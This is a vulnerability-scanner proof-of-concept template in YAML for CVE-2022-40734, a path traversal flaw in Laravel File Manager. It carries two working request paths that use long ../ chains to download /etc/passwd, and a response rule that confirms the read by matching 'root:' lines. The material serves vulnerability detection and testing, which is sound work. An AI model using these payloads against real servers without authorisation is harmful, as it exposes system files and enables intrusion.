name: poc-yaml-laravel-filemanager-cve-2022-40734-path-traversal
binding: ed2a7dca-ce91-4faf-b031-15b608164a5a
manual: true
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://github.com/UniSharp/laravel-filemanager/issues/1150
    vulnerability:
        id: CT-486874
        level: medium
transport: http
payloads:
    payloads:
        req01:
            urlpath: |
                "download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd"
        req02:
            urlpath: |
                "laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd"
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /{{urlpath}}
        expression: |
            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
